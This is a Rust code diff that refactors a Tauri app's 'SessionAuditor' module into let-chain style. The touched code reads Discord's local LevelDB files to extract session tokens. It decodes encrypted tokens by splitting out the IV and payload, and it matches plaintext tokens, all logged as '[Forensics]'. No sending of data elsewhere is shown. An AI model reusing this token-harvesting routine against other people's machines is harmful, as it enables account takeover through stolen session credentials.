@@ -58,25 +58,23 @@ impl SessionAuditor {
     pub fn extrapolate_client_id(app: &tauri::AppHandle) -> String {
         // Known Official Discord Application IDs
         // 947330329678028831: Discord's own "official" ID for activity/RPC
-        let default_ids = vec!["947330329678028831", "1473823776247382097"];
+        let default_ids = ["947330329678028831", "1473823776247382097"];
 
         // Attempt to find configured IDs in local settings
         let paths = Self::get_discord_paths();
         for path in paths {
             let settings_path = path.join("settings.json");
-            if settings_path.exists() {
-                if let Ok(content) = fs::read_to_string(&settings_path) {
-                    if let Ok(json) = serde_json::from_str::<Value>(&content) {
-                        if let Some(id) = json["client_id"].as_str() {
-                            Logger::debug(
-                                app,
-                                &format!("[Forensics] Extracted client_id from settings: {}", id),
-                                None,
-                            );
-                            return id.to_string();
-                        }
-                    }
-                }
+            if settings_path.exists()
+                && let Ok(content) = fs::read_to_string(&settings_path)
+                && let Ok(json) = serde_json::from_str::<Value>(&content)
+                && let Some(id) = json["client_id"].as_str()
+            {
+                Logger::debug(
+                    app,
+                    &format!("[Forensics] Extracted client_id from settings: {}", id),
+                    None,
+                );
+                return id.to_string();
             }
         }
 
@@ -215,17 +213,15 @@ impl SessionAuditor {
             if entry
                 .path()
                 .extension()
-                .map_or(false, |ext| ext == "ldb" || ext == "log")
+                .is_some_and(|ext| ext == "ldb" || ext == "log")
+                && let Ok(content) = fs::read(entry.path())
             {
-                if let Ok(content) = fs::read(entry.path()) {
-                    let text = String::from_utf8_lossy(&content);
-                    for cap in re_enc.captures_iter(&text) {
-                        let b64 = &cap[1];
-                        let encrypted_token = general_purpose::STANDARD.decode(b64).ok()?;
-
-                        if encrypted_token.len() < 15 {
-                            continue;
-                        }
+                let text = String::from_utf8_lossy(&content);
+                for cap in re_enc.captures_iter(&text) {
+                    let b64 = &cap[1];
+                    if let Ok(encrypted_token) = general_purpose::STANDARD.decode(b64)
+                        && encrypted_token.len() >= 15
+                    {
                         let iv = &encrypted_token[3..15];
                         let payload = &encrypted_token[15..];
 
@@ -269,16 +265,15 @@ impl SessionAuditor {
             if entry
                 .path()
                 .extension()
-                .map_or(false, |ext| ext == "ldb" || ext == "log")
+                .is_some_and(|ext| ext == "ldb" || ext == "log")
+                && let Ok(content) = fs::read(entry.path())
             {
-                if let Ok(content) = fs::read(entry.path()) {
-                    let text = String::from_utf8_lossy(&content);
-                    for cap in re.find_iter(&text) {
-                        let token = cap.as_str().to_string();
-                        if token.len() > 50 {
-                            Logger::debug(app, "[Forensics] Plaintext token identified.", None);
-                            return Some(token);
-                        }
+                let text = String::from_utf8_lossy(&content);
+                for cap in re.find_iter(&text) {
+                    let token = cap.as_str().to_string();
+                    if token.len() > 50 {
+                        Logger::debug(app, "[Forensics] Plaintext token identified.", None);
+                        return Some(token);
                     }
                 }
             }
